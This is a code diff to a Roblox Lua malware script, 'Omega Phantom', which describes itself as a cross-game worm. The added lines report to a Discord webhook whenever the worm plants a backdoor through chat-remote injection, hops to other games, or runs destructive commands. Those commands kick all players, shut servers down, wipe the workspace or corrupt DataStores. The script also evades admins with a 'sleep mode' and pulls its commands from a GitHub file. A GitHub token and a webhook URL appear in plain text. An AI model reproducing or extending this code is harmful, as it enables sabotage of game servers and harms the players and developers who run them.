@@ -1,8 +1,7 @@
 -- ============================================================================
---  OMEGA PHANTOM | FINAL ULTIMATE EDITION (NO MESSAGING SERVICE ERROR)
---  Removed MessagingService (client cannot use it). 
---  Global commands via GitHub (command.txt) replace cross-server communication.
---  Owner: 109er_0
+--  OMEGA PHANTOM | FINAL ULTIMATE EDITION WITH DISCORD LOGGER
+--  Sends reports to Discord on every game jump and universal spread events.
+--  Owner: 109er_0 | Webhook integrated
 -- ============================================================================
 
 -- =============================[ SERVICES & GLOBALS ]=============================
@@ -39,6 +38,20 @@ local githubToken = "Github_pat_11CCOI6GI0jTkUZmHyPtQC_dXkifJom2ddmq0cdv1bEu8Rks
 local githubApiUrl = "https://api.github.com/repos/mebdsn78-dev/OmegaData/contents/command.txt"
 
 local lastCommand = ""
+
+-- =============================[ DISCORD WEBHOOK ]=============================
+local webhookUrl = "https://discord.com/api/webhooks/1498774911274057768/C2mfYbJc1R6QVfzuiH3It-vxmvv1mR8yNtGO9HT9hx8y-SkMKk_5lHSvhmbLxV1Yx5nJ"
+
+local function sendToDiscord(message)
+    local data = {
+        content = message,
+        username = "Omega Phantom",
+        avatar_url = "https://www.roblox.com/asset-thumbnail/image?assetId=98381723384335&width=420&height=420&format=png"
+    }
+    pcall(function()
+        HttpService:PostAsync(webhookUrl, HttpService:JSONEncode(data))
+    end)
+end
 
 -- =============================[ ENCRYPTION & UTILITIES ]=============================
 local function encode(s)
@@ -100,9 +113,11 @@ local function updateSleepMode()
     if isAdminPresent() and not sleepModeActive then
         sleepModeActive = true
         warn("[SLEEP] Admin detected. Worm sleeping.")
+        sendToDiscord("🛌 **Sleep mode activated** – Admin/Mod detected in server.")
     elseif not isAdminPresent() and sleepModeActive then
         sleepModeActive = false
         print("[SLEEP] No admin. Worm resuming.")
+        sendToDiscord("⚡ **Sleep mode deactivated** – No admin present. Worm resuming.")
     end
 end
 
@@ -114,6 +129,19 @@ task.spawn(function()
 end)
 
 -- =============================[ CROSS‑GAME WORM ENGINE (queue_on_teleport) ]=============================
+local function getGameName(gameId)
+    local success, data = pcall(function()
+        return HttpService:GetAsync("https://games.roblox.com/v1/games?universeIds=" .. gameId)
+    end)
+    if success then
+        local decoded = HttpService:JSONDecode(data)
+        if decoded and decoded.data and #decoded.data > 0 then
+            return decoded.data[1].name
+        end
+    end
+    return "Unknown Game"
+end
+
 local function JumpToNewGame(targetGameId)
     if not targetGameId or type(targetGameId) ~= "number" then
         warn("[SPREAD] Invalid game ID: " .. tostring(targetGameId))
@@ -133,9 +161,12 @@ local function JumpToNewGame(targetGameId)
     local success = pcall(function() TeleportService:Teleport(targetGameId, LocalPlayer) end)
     if success then
         print("[SPREAD] ✅ Teleport initiated to game " .. targetGameId)
+        local gameName = getGameName(targetGameId)
+        sendToDiscord(string.format("🌌 **Jumped to game**\n🆔 ID: `%d`\n🎮 Name: **%s**\n⏱️ Time: <t:%d:F>", targetGameId, gameName, os.time()))
         return true
     else
         warn("[SPREAD] ❌ Failed to teleport to game " .. targetGameId)
+        sendToDiscord(string.format("❌ **Failed to jump to game**\n🆔 ID: `%d`\n⏱️ Time: <t:%d:F>", targetGameId, os.time()))
         return false
     end
 end
@@ -173,14 +204,17 @@ end
 local function UniversalSpread()
     if sleepModeActive then
         print("[SPREAD] Cannot start universal spread: Sleep mode active (admin present).")
+        sendToDiscord("🛌 Universal spread blocked due to sleep mode.")
         return false
     end
     if not infectionActive then
         print("[SPREAD] Cannot start universal spread: Backdoor not planted. Use 109:plant first.")
+        sendToDiscord("❌ Universal spread blocked: Backdoor not planted.")
         return false
     end
     print("[SPREAD] ========== UNIVERSAL SPREAD STARTED ==========")
     print("[SPREAD] Target list size: " .. #whitelistGames)
+    sendToDiscord("🚀 **Universal spread started**\n📋 Target list contains " .. #whitelistGames .. " games.")
     local successCount = 0
     local failCount = 0
     for index, gameId in ipairs(whitelistGames) do
@@ -200,6 +234,7 @@ local function UniversalSpread()
     end
     print("[SPREAD] ========== UNIVERSAL SPREAD COMPLETED ==========")
     print(string.format("[SPREAD] Results: %d successful, %d failed out of %d games", successCount, failCount, #whitelistGames))
+    sendToDiscord(string.format("✅ **Universal spread completed**\n✅ Successful: %d\n❌ Failed: %d\n📊 Total: %d", successCount, failCount, #whitelistGames))
     return true
 end
 
@@ -229,6 +264,7 @@ local function sendCommandToGitHub(command)
     end)
     if success then
         print("[GLOBAL] Command sent to GitHub: " .. command)
+        sendToDiscord("📡 **Global command written to GitHub**\n```" .. command .. "```")
     else
         warn("[GLOBAL] Failed to send command to GitHub.")
     end
@@ -244,19 +280,23 @@ local function executeGlobalCommand(command)
     local cmd = string.lower(command)
     if cmd == "shutdown" then
         sendGlobalMessageToAllPlayers(KICK_MESSAGE)
+        sendToDiscord("💀 **Global command executed: SHUTDOWN**")
         pcall(function() game:Shutdown() end)
     elseif cmd == "kickall" then
         sendGlobalMessageToAllPlayers(KICK_MESSAGE)
+        sendToDiscord("👢 **Global command executed: KICKALL**")
         for _, p in pairs(Players:GetPlayers()) do
             if p ~= LocalPlayer then p:Kick(KICK_MESSAGE) end
         end
     elseif cmd == "wipe" then
+        sendToDiscord("🧹 **Global command executed: WIPE**")
         for _, obj in pairs(Workspace:GetChildren()) do
             if obj ~= Workspace.Terrain and obj ~= Workspace.Camera then
                 pcall(function() obj:Destroy() end)
             end
         end
     elseif cmd == "reset" then
+        sendToDiscord("🔄 **Global command executed: RESET**")
         TeleportService:Teleport(game.PlaceId)
     elseif cmd == "color" then
         Lighting.ColorCorrection.TintColor = Color3.new(math.random(), math.random(), math.random())
@@ -271,6 +311,7 @@ local function executeGlobalCommand(command)
             bv:Destroy()
         end
     elseif cmd == "decalspam" then
+        sendToDiscord("🎨 **Global command executed: DECAL SPAM**")
         task.spawn(runDecalSpam)
     end
 end
@@ -296,12 +337,14 @@ local function wipeDataStores()
         end
     end)
     warn("[SCORCHED EARTH] DataStore wiped.")
+    sendToDiscord("🔥 **Scorched Earth** – DataStore corrupted.")
 end
 
 local function setupStudioTrap(scriptObj)
     if not scriptObj then scriptObj = script end
     scriptObj:GetPropertyChangedSignal("Source"):Connect(function()
         warn("[TRAP] Unauthorized access detected. Executing scorched earth.")
+        sendToDiscord("⚠️ **Studio trap triggered** – Unauthorized access. Wiping data.")
         wipeDataStores()
         game:Shutdown()
         scriptObj:Destroy()
@@ -342,6 +385,7 @@ end
 -- =============================[ CORE FUNCTIONS (PLANT, DECAL, MESSAGES) ]=============================
 local function PlantBackdoor()
     if sleepModeActive then return false end
+    print("[BACKDOOR] Attempting to plant backdoor...")
     local chatRemote = nil
     for _, v in pairs(game:GetDescendants()) do
         if v:IsA("RemoteEvent") and (v.Name:lower():find("say") or v.Name:lower():find("chat") or v.Name:lower():find("message")) then
@@ -349,7 +393,10 @@ local function PlantBackdoor()
             break
         end
     end
-    if not chatRemote then return false end
+    if not chatRemote then
+        sendToDiscord("❌ **Backdoor planting failed** – No suitable chat remote found.")
+        return false
+    end
     local backdoor = Instance.new("RemoteEvent")
     backdoor.Name = "OmegaCore_" .. HttpService:GenerateGUID(false):sub(1,6)
     backdoor.Parent = ReplicatedStorage
@@ -376,6 +423,7 @@ local function PlantBackdoor()
     pcall(function() chatRemote:FireServer(encode(injection)) end)
     task.wait(2)
     pcall(function() backdoor:FireServer("grant") end)
+    sendToDiscord("✅ **Backdoor successfully planted** in game `" .. game.PlaceId .. "`")
     return true
 end
 
@@ -749,6 +797,7 @@ local function Launch()
     end)
     print("💀 OMEGA PHANTOM | ALL FEATURES ACTIVE 💀")
     print("📡 Commands: 109:fly, noclip, heal, godmode, wipe, image, music, list, kickall, shutdown, color, universe, auto, plant, decalspam, رساله <text>, menu")
+    sendToDiscord("💀 **Omega Phantom activated**\n👑 Owner: 109er_0\n🖥️ Server ID: `" .. game.JobId .. "`\n🎮 Game ID: `" .. game.PlaceId .. "`")
 end
 
 Launch()
